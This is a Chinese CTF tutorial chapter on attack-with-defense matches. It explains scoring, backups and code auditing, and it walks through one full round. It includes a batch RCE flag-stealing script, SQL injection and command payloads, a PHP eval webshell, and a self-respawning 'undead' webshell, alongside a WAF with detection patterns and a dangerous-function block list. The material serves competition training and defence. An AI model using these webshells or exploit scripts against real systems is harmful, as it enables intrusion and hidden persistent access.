---
comments: true
---

# AWD模式

「攻防模式 | AWD (Attack With Defense)」是 CTF 线下赛最常见的模式之一：每个队伍拿到一台 **完全相同** 的靶机（GameBox），上面跑着有漏洞的 Web 服务。你既要去打别人的服务拿 flag，也要修好自己服务上的漏洞防止被打。本章站在 Web 方向初学者的角度，把「规则 → 开局 → 修复 → 维持 → 分工 → 工具」整条链路讲一遍，目标是让你第一次上 AWD 赛场时不会手足无措。

AWD 的总体介绍可以配合「AWD介绍」一章阅读，更多奇技淫巧见「【WEB】AWD技巧」，本章侧重 **可落地的标准流程**。

## 赛制规则与计分逻辑

不同比赛的细则略有差异，但核心都是三样东西：**flag、check、回合（round）**。

- **回合制**：比赛按回合推进，常见为每 5～10 分钟一个回合。每个回合 flag 会刷新一次（或者刷新提交冷却），所以偷来的 flag 要 **当回合内提交**，过期作废。
- **攻击得分**：你利用漏洞从别人的服务里读出 flag，并提交到平台的 flag 提交接口，得分。通常采用零和积分——你加的分就是从被打穿的队伍身上扣的分。
- **服务可用性（check）**：主办方会周期性检查你的服务是否正常。检查内容一般是：页面能正常访问、核心功能（登录、下单、留言……）能跑通、flag 能被 checker 正常读取。check 不过会扣分，而且往往扣得比被打一次还多。
- **流量/异常检测**：部分比赛还设有「异常行为扣分」，比如你的服务响应了非预期内容。

由此得到 AWD 的第一性原理，请务必刻在脑子里：

> **修复的前提是 check 不能挂。** 一个被打穿但能跑的服务，比一个安全但宕机的服务值钱得多。一切防御动作都要先问一句：这样改 checker 还能过吗？

其次要搞清楚三件事再动手（开赛前向主办方确认或读规则文档）：

1. flag 的格式和位置（`flag{...}`？在数据库里还是在文件里？）；
2. flag 提交方式（平台页面？HTTP API？提交频率限制？）；
3. 你能对自己的机器做什么（能否 SSH 上去？能否重启服务？能否改配置重启 PHP-FPM？）。

## 开局流程

开局前 15 分钟基本决定整场比赛的走向。标准动作顺序：**备份 → 找洞 → 打点 → 修复**。

### 第一步：备份源码

拿到机器第一时间把网站目录整个拖回来。被打坏、自己改挂、或者想回滚时，这是你唯一的后悔药。

```bash
# 在靶机上打包（如果给了 SSH 权限）
ssh user@192.168.1.10 'tar czf /tmp/www_backup.tar.gz -C /var/www html'

# 拉回本地
scp user@192.168.1.10:/tmp/www_backup.tar.gz ./backup_round0.tar.gz
```

在本地留一份 **原始未改动** 的副本，另开一份工作目录去改，改完用 `diff -ru` 确认自己到底动了哪些文件：

```bash
diff -ru backup_html/ html/
```

同时也把数据库导出一份（如果 flag 在数据库里，备份数据库等于备份了 flag 的结构）：

```bash
mysqldump -u root -p'密码' --all-databases > db_backup.sql
```

### 第二步：快速审计找洞

AWD 的题都是批量生成的，漏洞通常 **很直白**：一个宽口径的 SQL 注入、一个无过滤的上传、一句 `eval($_POST['cmd'])`、一个硬编码的弱口令后台。用「PHP代码审计」一章的方法，配合 grep 一把梭：

```bash
cd html/
# 找危险函数
grep -rn --include='*.php' -E 'eval|assert|system|exec|shell_exec|passthru|popen|proc_open|file_put_contents|fwrite' .
# 找文件操作/包含
grep -rn --include='*.php' -E 'include|require|file_get_contents|unlink|copy|move_uploaded_file' .
# 找 SQL 拼接
grep -rn --include='*.php' -E '\$_(GET|POST|REQUEST|COOKIE)' . | grep -iE 'select|insert|update|delete'
```

对应漏洞的利用细节分别参见「SQL注入」「文件上传」「文件包含」「RCE」各章，这里不再展开。**AWD 里只需要找到一个能稳定读 flag 的洞就够了**，不需要挖全。

### 第三步：批量打点脚本

AWD 的目标是一整个网段的同构机器（比如 `192.168.1.11` 到 `192.168.1.30`），手工一台台打是不可能的，必须写脚本循环打、自动交 flag。

以「漏洞是 `?cmd=` 直接 RCE，flag 在 `/flag`」为例，最小批量脚本：

```python
import re
import requests

# 目标列表：通常排除自己的 IP，具体规则以主办方为准
TARGETS = [f"192.168.1.{i}" for i in range(11, 31) if i != 10]

FLAG_RE = re.compile(r"flag\{[0-9a-fA-F-]{8,}\}")  # 按实际 flag 格式调整
SUBMIT_URL = "https://awd.example.com/api/submit"     # 平台提交接口
TOKEN = "你的队伍token"

def attack(ip):
    url = f"http://{ip}:8080/index.php"
    try:
        r = requests.get(url, params={"cmd": "cat /flag"}, timeout=3)
        m = FLAG_RE.search(r.text)
        return m.group(0) if m else None
    except requests.RequestException:
        return None

def submit(flag):
    try:
        r = requests.post(SUBMIT_URL, json={"flag": flag, "token": TOKEN}, timeout=5)
        print(f"    submit {flag}: {r.status_code} {r.text[:80]}")
    except requests.RequestException as e:
        print(f"    submit failed: {e}")

for ip in TARGETS:
    flag = attack(ip)
    print(f"[*] {ip} -> {flag}")
    if flag:
        submit(flag)
```

要点只有四个，但初学者最容易漏：

- **超时必须设**（`timeout=3`），一台挂掉的目标不能拖垮整个循环；
- **排除自己的 IP**，打自己不加分还可能把服务打挂；
- flag 提取用正则按 **实际格式** 匹配，别假设；
- 提交失败要打印响应，常见原因是 token 错、频率限制、flag 已过期。

每回合跑一次（手动跑或 `while True: ...; sleep(300)`），就是一个完整的攻击闭环。

### 第四步：通杀 payload 的快速落地

AWD 时间紧，payload 要提前备好「开箱即用」的版本，看到洞直接套。常备的几类：

```bash
# 读 flag（flag 在文件里）
cat /flag
cat /flag.txt
cat $(find / -name 'flag*' 2>/dev/null | head -1)

# flag 在数据库里（通过 SQL 注入读）
' UNION SELECT flag FROM flags-- -
```

如果漏洞是文件上传（参见「文件上传」），提前准备好一句话木马和对应连接参数，上传后直接纳入批量脚本：

```php
<?php @eval($_POST['cmd']); ?>
```

「通杀」的关键不是 payload 多花哨，而是 **确认这一个洞在所有靶机上都一样**。开局先挑一两台别人的机器手工验证 payload，确认返回里有 flag，再铺到批量脚本里。

## 修复策略

攻击脚本跑起来之后，立刻回头修自己。修法的取舍标准只有一个：**挡住这个洞，且 check 不挂**。

### 删危险点（首选）

如果漏洞点本身就是无用代码（出题人埋的 `eval` 后门、调试接口、硬编码后门账号），直接删掉是最干净的：

```php
// 删掉之前
if (isset($_GET['cmd'])) { eval($_GET['cmd']); }   // 整段删除

// 上传点如果在比赛功能里根本用不到，可以把整个 upload.php 改名或删除
```

删文件前先确认 checker 不访问它——开局时抓一份 checker 的流量（方法见后文）就能知道 checker 会打哪些路径。

### 函数过滤 / 参数校验

洞在正常功能里（比如留言板的 SQL 注入），不能删功能，只能修代码。原则是 **最小改动**：

```php
// 修之前：$id = $_GET['id'];直接拼进 SQL
// 修之后：强制转 int，功能性无损，注入面直接消失
$id = intval($_GET['id']);
```

字符串参数用预编译或转义；命令执行类功能能用白名单就用白名单。不要花时间去写「完美修复」，AWD 里「够用的修复 + check 通过」就是满分。

另外可以在 PHP 配置层面禁用危险函数（改了 `php.ini` 记得重启 PHP-FPM，且确认 Web 服务本身不依赖这些函数，否则 check 会挂）：

```ini
disable_functions = system,exec,shell_exec,passthru,popen,proc_open,assert,eval
```

### WAF 文件（兜底手段）

实在来不及审代码，或者漏洞点太多，可以在所有 PHP 文件前自动挂一个 WAF。利用 `php.ini` 的 `auto_prepend_file`：

```ini
auto_prepend_file = /var/www/html/waf.php
```

```php
<?php
// waf.php：极简 WAF，够用即止
$input = file_get_contents('php://input') . ' ' . $_SERVER['QUERY_STRING'] . ' ' . json_encode($_POST);
$pattern = '/(\bunion\b.*\bselect\b|\bselect\b.*\bfrom\b|cat\s+\/flag|eval\s*\(|system\s*\(|<\?php)/i';
if (preg_match($pattern, $input)) {
    die('hacker!');
}
?>
```

WAF 是双刃剑，务必想清楚取舍：

- **优点**：一处部署、全站生效，几分钟搞定；
- **缺点**：规则太宽会误杀正常请求（checker 挂了比被打更亏）；规则太窄会被别人绕过继续打；而且 **别的队伍也会用同样的 WAF 规则反过来防你**。

所以 WAF 的正确用法是：上线前先拿自己网站的核心功能（模拟 checker 的请求）过一遍确认不误杀，比赛中根据抓到的别人攻击流量 **持续收紧规则**。

修复完成的标准动作：本地改 → 上传 → 自己访问核心功能确认正常 → 用自己写的攻击脚本打一遍自己确认打不动 → 等下一轮 check 结果。

## 权限维持与流量监控

### 不死马

AWD 里你打进别人机器的同时别人也在打你。双方都修了漏洞之后，比拼的就是谁留下的后门更隐蔽。「不死马」是经典手段：一个驻留内存、循环写马的 PHP 进程，删了又会自己生成。

```php
<?php
// ignore_user_abort：客户端断开也继续跑；set_time_limit(0)：永不超时
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);                 // 自我删除，只留下内存中的进程
$file = '/var/www/html/.config.php';  // 藏一个不起眼的路径
while (true) {
    file_put_contents($file, '<?php @eval($_POST["pass"]); ?>');
    usleep(500000);               // 每 0.5 秒重新写一次
}
?>
```

访问一次后，进程会在后台无限重生一句话木马，对方删文件也没用（要 `kill` 掉对应 PHP-FPM 进程或重启服务才能清除）。

讲它的目的主要是 **让你防**：发现机器莫名多出 PHP 文件、删了又出现，就该怀疑中了不死马。查法：

```bash
ps aux | grep -E 'php|www'          # 找异常 PHP 进程
kill -9 <pid>                        # 杀掉后删马
# 或者干脆重启服务：service php-fpm restart
```

同样，内存马、定时任务（`crontab -l` 检查）、`.bashrc` 后门都要排查。攻防一体：你会用什么，就重点防什么。

### tcpdump 抓别人的 payload

流量监控是 AWD 信息差最大的来源。抓自己机器的流量，能同时得到三样东西：checker 长什么样（修代码的底线）、谁在打我（对方的 IP 和 payload）、我没发现的洞（别人用别的洞打进来了）。

```bash
# 抓 80 端口的 POST 请求体，实时看
tcpdump -i any -A -s 0 'tcp port 80 and tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354'
# 0x504f5354 即 ASCII "POST"，只匹配 POST 包，减少噪音

# 或者先存下来慢慢分析
tcpdump -i any -s 0 -w /tmp/traffic.pcap port 80
```

抓到别人打你的 payload 后：

1. 照猫画虎打回去——他的 payload 证明了这条利用链有效，直接加进你的批量脚本；
2. 反推漏洞点——他打的路径/参数就是你还没修的洞；
3. 把特征加进 WAF 规则里。

也可以直接 `tail -f` Web 日志看访问记录（日志路径的找法见「【WEB】AWD技巧」），但日志只有 URL 没有 POST body，能抓包优先抓包。

## 团队分工建议

AWD 是团队赛，三个人各干一摊比三个人挤在一起审代码强得多。一个经过验证的最小分工：

- **攻击手（1 人）**：只管攻击链。开局手工验证 payload，之后维护批量脚本，每回合确保脚本跑完、flag 都提交了。抓到的别人 payload 也由他测试和武器化。
- **防守手（1 人）**：只管自己这台机器。备份、修洞、上 WAF、查杀不死马、盯 check 状态。判断标准：check 一直绿，且自己的攻击脚本打不动自己。
- **审计/情报手（1 人）**：继续审源码找 **别的洞**（别人用你没见过的 payload 打进来时，由他定位新漏洞点），同时盯流量、整理 flag 提交情况和记分板信息。

人多的话按「每方向一个攻击手」扩，人少的话合并为「一人攻击+审计，一人防守+流量」。关键是 **职责边界清晰、每回合碰头一次**，避免两个人同时改同一个文件把服务改挂。

## 常用脚本框架与工具箱清单

赛前把这些东西准备好放进一个 U 盘/git 仓库，赛场上全是即战力：

- **批量攻击脚本模板**：就是上文那个 Python 循环的通用版——目标列表、攻击函数、flag 正则、提交函数四段式。提前按常见提交接口（HTTP POST、TCP 直连）各写一份。
- **现成框架**：`awd-framework` 类的开源轮子（GitHub 搜 "AWD 框架"）把循环调度、多线程、flag 去重提交都做好了，会用即可，但 **建议自己写过一遍上面那个最小脚本** 再依赖框架——框架挂了你得能手工顶上。
- **一句话木马与客户端**：各种语言的一句话（PHP/JSP/ASP）、蚁剑（AntSword）或冰蝎（Behinder），以及上传利用的「文件上传」章节知识。
- **通杀 payload 集**：读文件、SQL 注入、命令执行的常用 payload，按「PHP特性与常见绕过」「SQL注入」「RCE」各章整理成文本文件。
- **WAF 模板**：上面那个 `waf.php` 的加强版（分 GET/POST/COOKIE 检测、带日志记录），以及 `disable_functions` 配置片段。
- **备份/部署脚本**：一条命令完成「本地改好的目录 → 覆盖靶机 → 重启服务」的 rsync 脚本。
- **抓包工具**：`tcpdump` 命令行模板，本机装好 Wireshark 用于赛后复盘分析 `.pcap`。
- **信息收集小抄**：找 Web 目录、日志、配置文件的 `find` 命令集（见「【WEB】AWD技巧」）。

## 一个回合的完整实战流程

把上面的点串起来，一个标准回合长这样（以「Web 服务存在 `?cmd=` RCE，flag 在 `/flag`」为例）：

1. **T+0 分钟**：SSH 上机，`tar` 备份源码和数据库到本地；另开终端 `tcpdump -i any -s 0 -w round.pcap port 80` 开始抓包。
2. **T+3 分钟**：防守手 `grep -rn 'eval\|system' html/` 找到 `index.php` 里 `eval($_GET['cmd'])`；攻击手手工验证 `curl 'http://192.168.1.12:8080/?cmd=cat /flag'` 返回 `flag{...}`，通杀确认。
3. **T+5 分钟**：攻击手把 `?cmd=cat /flag` 填进批量脚本跑全段，提交 flag；防守手在本地删掉那行 `eval`，上传，访问首页和核心功能确认正常，再用攻击脚本打自己确认打不穿。
4. **T+8 分钟**：流量手 `tail -f` 日志 + 看 pcap，发现有人往 `/upload.php` POST 了不死马（自己机器上），立刻 `ps aux | grep php` 找到异常进程 `kill` 掉并删马、修上传点；同时把对方读 flag 的 payload 记下来转给攻击手。
5. **T+10 分钟**：回合结束。确认记分板：攻击得分到账、check 全绿、无异常扣分。三人碰头 30 秒同步情报，进入下一回合。

整场比赛就是这个循环的重复：攻击脚本自动化之后，人的精力全部花在「找新洞、防新招」上——这正是 AWD 比解题赛更贴近真实攻防的地方。
